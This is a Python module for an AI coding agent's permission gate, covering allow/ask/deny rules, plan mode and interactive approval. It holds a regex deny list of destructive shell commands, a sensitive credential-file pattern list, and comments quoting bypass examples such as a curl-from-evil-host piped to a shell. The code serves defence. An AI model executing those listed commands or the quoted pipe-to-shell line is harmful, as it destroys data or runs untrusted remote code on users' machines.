"""权限确认系统：allow / ask / deny 规则、权限模式、计划模式门控、交互式审批。"""

import fnmatch
import re
from dataclasses import dataclass, field
from typing import Any

# NOTE:只读工具清单：默认直接放行，无需用户确认
READ_ONLY_TOOLS = frozenset(
    {
        "read_file",
        "read_file_range",
        "list_files",
        "tree",
        "search_in_files",
        "web_search",
        "fetch_url",
        "git_status",
        "git_diff",
        "git_log",
        "git_branch",
        "show_history",
        "use_skill",
        "list_skills",
        "list_skill_files",
        "use_skill_file",
        "task",
        "enter_plan_mode",
        "exit_plan_mode",
        "index_codebase",
        "search_symbols",
        "get_symbol_context",
        "review_changes",
        "project_health",
        "go_to_definition",
        "find_references",
        "get_type_info",
        "get_docstring",
    }
)

# NOTE:写/执行工具清单：默认需要用户确认（除非处于 bypass/solo 模式）
WRITE_TOOLS = frozenset(
    {
        "create_file",
        "write_file",
        "write_file_complete",
        "append_file",
        "delete_file",
        "rename_file",
        "copy_file",
        "run_shell",
        "run_file",
        "run_tests",
        "format_code",
        "install_deps",
        "git_add",
        "git_commit",
        "git_checkout",
        "undo_last",
        "start_preview",
        "stop_preview",
        "update_memory",
    }
)

# NOTE:内置高危命令正则模式，无论权限模式如何一律拦截
BUILTIN_DANGEROUS: list[tuple[str, str]] = [
    (r"rm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)?/?\*|rm\s+-rf\s+/", "递归删除根目录"),
    (r"\bmkfs\.?\w*\b", "格式化磁盘"),
    (r"\bmkswap\b", "交换分区操作"),
    (r"\bfdisk\b[^;|&\n]*", "磁盘分区操作"),
    (r"\bdd\s+if=[^\s]+", "dd 磁盘写入"),
    (r"\bchmod\s+(-[a-zA-Z]*[Rr][a-zA-Z]*\s+)?777\s+/", "对根目录设置 777"),
    (r"git\s+push\s+.*--force", "强制推送"),
    (r"git\s+reset\s+--hard", "git 硬重置"),
    (r"\brm\s+-rf\s+(~|%USERPROFILE%)", "删除用户主目录"),
]

# NOTE:预编译高危命令正则，避免每次权限检查时重复编译
_COMPILED_DANGEROUS: list[tuple[re.Pattern, str]] = [
    (re.compile(pattern, re.IGNORECASE), reason)
    for pattern, reason in BUILTIN_DANGEROUS
]

# NOTE:敏感文件路径模式：读取这些文件即使本身是只读操作也需要确认
_SENSITIVE_PATTERNS = [
    r"\.env",
    r"id_rsa",
    r"id_ed25519",
    r"id_ecdsa",
    r"id_dsa",
    r"\.pem$",
    r"\.key$",
    r"\.p12$",
    r"\.pfx$",
    r"\.htpasswd",
    r"credentials",
    r"secret",
    r"token",
    r"password",
    r"private",
    r"\.ssh",
    r"\.aws",
    r"kubeconfig",
    r"\.dockerconfigjson",
    r"settings\.json",
]
_SENSITIVE_FILE_RE = re.compile("|".join(_SENSITIVE_PATTERNS), re.IGNORECASE)


# NOTE:工具分类：非只读工具一律视为 action（MCP 工具同样走 action 兜底逻辑）
def _classify(tool_name: str) -> str:
    """返回工具类别: read | action。"""
    return "read" if tool_name in READ_ONLY_TOOLS else "action"


# NOTE:只读 shell 命令前缀白名单（自动放行，无需确认）
# 注意：只允许无 shell 元字符的单条命令（见 _SHELL_METACHARS_RE 校验），
# 防止 "ls; rm -rf /"、"git status && curl evil.sh|sh" 之类的前缀绕过。
READONLY_SHELL_PREFIXES = (
    "ls ",
    "ls\n",
    "cat ",
    "head ",
    "tail ",
    "grep ",
    "rg ",
    "find ",
    "pwd",
    "echo ",
    "which ",
    "type ",
    "where ",
    "python --version",
    "node --version",
    "npm --version",
    "git status",
    "git log",
    "git diff",
    "git branch",
    "git show",
    "git remote",
    "git config --list",
    "git tag",
    "git ls-files",
    "git shortlog",
    "pip list",
    "npm list",
    "python -m pip list",
    "dir ",
)

# NOTE:shell 元字符黑名单：包含这些字符的命令绝不自动放行（需用户确认）
# 覆盖 ; & && || | < > 反引号 $() 换行（同时兼容 cmd.exe 与 bash）
_SHELL_METACHARS_RE = re.compile(r"[;&|<>`\r\n]|\$\(")


# NOTE:判断工具是否为写/执行类（非只读）
def is_write_tool(tool_name: str) -> bool:
    """是否属于写/执行类工具（非只读）。"""
    return _classify(tool_name) != "read"


# NOTE:权限继承：子代理/验收 AI 从父会话复制权限设置，避免重复询问
def inherit_permissions(parent: Any, perms: "PermissionManager") -> None:
    """从父会话复制权限相关设置到子（子代理/验收 AI），避免重复询问。

    parent 为 WorkspaceDeps，其 permissions 属性为父会话的 PermissionManager。
    """
    parent_perms = getattr(parent, "permissions", None)
    if parent_perms is None:
        return
    perms.solo_mode = parent_perms.solo_mode
    perms.headless = parent_perms.headless
    perms.mode = parent_perms.mode
    perms.allow_rules = list(parent_perms.allow_rules)
    perms.ask_rules = list(parent_perms.ask_rules)
    perms.deny_rules = list(parent_perms.deny_rules)
    perms._session_always = set(parent_perms._session_always)
    perms._session_never = set(parent_perms._session_never)


# NOTE:用户自定义权限规则（支持通配符与正则匹配目标）
@dataclass
class PermissionRule:
    action: str  # allow | ask | deny
    tool: str  # 支持 * 通配
    spec: str = ""  # 对目标串的正则，空表示不限制

    def matches_tool(self, tool_name: str) -> bool:
        if self.tool == "*":
            return True
        if "*" in self.tool:
            return fnmatch.fnmatch(tool_name, self.tool)
        return self.tool == tool_name

    def matches_target(self, target: str) -> bool:
        if not self.spec:
            return True
        try:
            return re.search(self.spec, target, re.IGNORECASE) is not None
        except re.error:
            return False


_RULE_RE = re.compile(r"^(?P<tool>[A-Za-z0-9_*\.-]+?)(?:\((?P<spec>.*)\))?$")


def parse_rule_string(raw: str) -> PermissionRule | None:
    raw = raw.strip()
    if not raw:
        return None
    m = _RULE_RE.match(raw)
    if not m:
        return None
    action = "allow"
    return PermissionRule(
        action=action, tool=m.group("tool"), spec=(m.group("spec") or "")
    )


# NOTE:权限管理器核心类，承载当前会话的所有权限状态与审批逻辑
@dataclass
class PermissionManager:
    console: Any = None
    workspace_dir: Any = None
    tool_tracker: Any = None  # 用于暂停状态显示
    status: Any = None  # rich Status 对象

    mode: str = "acceptEdits"
    plan_mode: bool = False
    headless: bool = False
    subagent_mode: bool = False
    solo_mode: bool = False

    allow_rules: list[PermissionRule] = field(default_factory=list)
    ask_rules: list[PermissionRule] = field(default_factory=list)
    deny_rules: list[PermissionRule] = field(default_factory=list)
    _session_always: set[str] = field(default_factory=set)
    _session_never: set[str] = field(default_factory=set)

    # NOTE:从 settings.json 加载用户自定义权限规则与会话模式
    def load_settings(self, settings: dict):
        perms = settings.get("permissions") or {}
        if not isinstance(perms, dict):
            return
        mode = perms.get("defaultMode")
        if mode in ("default", "acceptEdits", "plan", "bypass"):
            self.mode = mode
        for action, key in (("allow", "allow"), ("ask", "ask"), ("deny", "deny")):
            for raw in perms.get(key, []) or []:
                rule = parse_rule_string(str(raw))
                if rule is None:
                    continue
                rule.action = action
                getattr(self, f"{action}_rules").append(rule)

    # NOTE:检查目标是否触发了内置高危命令模式
    def _matches_dangerous(self, tool_name: str, target: str) -> str | None:
        if tool_name not in ("run_shell", "run_file", "install_deps", "run_tests"):
            return None
        for pattern, reason in _COMPILED_DANGEROUS:
            try:
                if pattern.search(target):
                    return reason
            except re.error:
                continue
        return None

    # NOTE:将工具参数归一化为字符串，用于规则匹配与 session 记忆键
    def target_str(
        self, tool_name: str, args: tuple = (), kwargs: dict | None = None
    ) -> str:
        kwargs = kwargs or {}
        parts = []
        for v in args:
            parts.append(str(v))
        for k, v in sorted(kwargs.items()):
            parts.append(f"{k}={v}")
        raw = " ".join(parts) if parts else ""
        # 规范化空白，避免换行/多余空格导致 session_always 无法命中
        return " ".join(raw.split())

    def _shell_command(self, args: tuple, kwargs: dict | None) -> str:
        kwargs = kwargs or {}
        if "command" in kwargs:
            return str(kwargs["command"])
        for v in args:
            if isinstance(v, str):
                return v
        return ""

    def _is_readonly_shell(self, command: str) -> bool:
        cmd = command.strip()
        if not cmd:
            return False
        # 含 shell 元字符（; & | > < 反引号 $() 换行等）的命令不是单条只读命令，
        # 一律不自动放行，防止 "ls; rm -rf /"、"git status && ..." 前缀绕过。
        if _SHELL_METACHARS_RE.search(cmd):
            return False
        low = cmd.lower()
        for prefix in READONLY_SHELL_PREFIXES:
            if low.startswith(prefix):
                return True
        return False

    def _is_sensitive_file(self, target: str) -> bool:
        return bool(_SENSITIVE_FILE_RE.search(target))

    # NOTE:核心决策逻辑：按 计划模式 > 高危行为 > 会话记忆 > 用户规则 > 只读白名单 > 模式兜底 的顺序判定
    def decide(
        self, tool_name: str, target: str, args: tuple = (), kwargs: dict | None = None
    ) -> str:
        """返回 allow / ask / deny。"""
        cat = _classify(tool_name)

        # 1. 计划模式：写操作一律拒绝
        if self.plan_mode and cat != "read":
            return "deny"

        # 2. 内置高危行为
        reason = self._matches_dangerous(tool_name, target)
        if reason:
            return "deny"

        # 3. 会话级记忆
        key = f"{tool_name} {target}"
        if key in self._session_never:
            return "deny"
        if key in self._session_always:
            return "allow"

        # 4. 用户规则：deny > ask > allow
        denied = any(
            r.matches_tool(tool_name) and r.matches_target(target)
            for r in self.deny_rules
        )
        if denied:
            return "deny"
        asked = any(
            r.matches_tool(tool_name) and r.matches_target(target)
            for r in self.ask_rules
        )
        allowed = any(
            r.matches_tool(tool_name) and r.matches_target(target)
            for r in self.allow_rules
        )
        if asked and not allowed:
            return "ask"
        if allowed:
            return "allow"

        # 5. 只读 shell 命令自动放行（但读取敏感文件仍需确认）
        if tool_name == "run_shell":
            cmd = self._shell_command(args, kwargs)
            if self._is_readonly_shell(cmd):
                if self._is_sensitive_file(cmd):
                    return "ask"
                return "allow"

        if self.solo_mode:
            return "allow"

        # 6. 按模式兜底
        if self.mode == "bypass":
            return "allow"
        # 读取敏感/危险文件需要确认
        if tool_name in ("read_file", "read_file_range") and self._is_sensitive_file(
            target
        ):
            return "ask"
        if cat == "read":
            return "allow"
        if self.mode == "acceptEdits":
            # 仅保留真正危险的操作需要确认
            if tool_name in ("run_shell", "run_file"):
                return "ask"
            if tool_name == "delete_file":
                return "ask"
            # 其他写操作、MCP 工具等全部放行
            return "allow"
        if self.mode == "plan":
            return "deny"
        return "ask"

    # NOTE:权限门控入口：调用 decide 并将结果转化为 None（放行）或错误字符串（拒绝/超时）
    def check(
        self, tool_name: str, args: tuple = (), kwargs: dict | None = None
    ) -> str | None:
        """权限门控入口。返回错误消息字符串（拒绝）或 None（放行）。"""
        target = self.target_str(tool_name, args, kwargs)
        decision = self.decide(tool_name, target, args, kwargs)

        if decision == "deny":
            if self.plan_mode:
                return (
                    "Permission denied: you are in plan mode, write/modify operations are not allowed. "
                    "Use only read-only tools to explore and produce a plan."
                )
            return f"Permission denied: {tool_name} is not allowed"

        if decision == "ask":
            if self.headless:
                return (
                    f"权限被拒绝: 无交互模式下无法确认工具 {tool_name}，"
                    "请在权限配置中显式 allow，或使用 --dangerously-skip-permissions。"
                )
            if self._ask_user(tool_name, target):
                return None
            self._session_never.add(f"{tool_name} {target}")
            return f"权限被拒绝: 用户取消了 {tool_name}"

        return None

    # NOTE:交互式审批：暂停 spinner 后询问用户 y/n/a，支持本次会话记忆
    def _ask_user(self, tool_name: str, target: str) -> bool:
        if self.console is None:
            return False
        self._pause_status()
        try:
            preview = target if len(target) <= 300 else target[:300] + "..."
            self.console.print()
            self.console.print(
                "[bold yellow]权限确认[/bold yellow] [dim]工具:[/dim] "
                f"[bold cyan]{tool_name}[/bold cyan]"
            )
            if preview:
                self.console.print(f"[dim]{preview}[/dim]")
            while True:
                try:
                    answer = (
                        self.console.input(
                            "[yellow]允许此操作? [/yellow][cyan]y[/cyan]是 / "
                            "[cyan]n[/cyan]否 / [cyan]a[/cyan]本次会话总是允许: "
                        )
                        .strip()
                        .lower()
                    )
                except EOFError:
                    self.console.print("[dim]输入流已关闭，操作已拒绝[/dim]")
                    return False
                if answer in ("y", "yes", "允许"):
                    return True
                if answer == "":
                    return True
                if answer in ("a", "always"):
                    self._session_always.add(f"{tool_name} {target}")
                    return True
                if answer in ("n", "no", "否", "q"):
                    return False
                self.console.print("[dim]请输入 y / n / a[/dim]")
        finally:
            self._resume_status()

    # NOTE:暂停状态栏与 spinner，避免和用户输入提示交错显示
    def _pause_status(self):
        if self.tool_tracker is not None:
            self.tool_tracker.paused = True
        if self.status is not None:
            try:
                self.status.stop()
            except Exception:
                pass

    # NOTE:恢复状态栏与 spinner，继续展示工具调用进度
    def _resume_status(self):
        if self.tool_tracker is not None:
            self.tool_tracker.paused = False
        if self.status is not None:
            try:
                self.status.start()
            except Exception:
                pass

    # NOTE:返回当前权限状态的摘要文本（模式、规则列表等）
    def summary(self) -> str:
        lines = [
            f"权限模式: {self.mode}",
            f"计划模式: {'开' if self.plan_mode else '关'}",
            f"无人值守(Solo): {'开' if self.solo_mode else '关'}",
            f"无交互(headless): {'开' if self.headless else '关'}",
        ]
        if self.deny_rules:
            lines.append(
                "deny 规则: "
                + ", ".join(f"{r.tool}({r.spec})" for r in self.deny_rules)
            )
        if self.ask_rules:
            lines.append(
                "ask 规则: " + ", ".join(f"{r.tool}({r.spec})" for r in self.ask_rules)
            )
        if self.allow_rules:
            lines.append(
                "allow 规则: "
                + ", ".join(f"{r.tool}({r.spec})" for r in self.allow_rules)
            )
        return "\n".join(lines)


# NOTE:供 args_validator 调用的快捷门控函数：从 RunContext 提取权限管理器并执行检查
def check_permission(
    ctx, tool_name: str, args: tuple = (), kwargs: dict | None = None
) -> str | None:
    """从 RunContext 中取权限管理器并执行门控。返回错误消息或 None。"""
    perms = getattr(ctx.deps, "permissions", None)
    if perms is None:
        return None
    return perms.check(tool_name, args, kwargs or {})
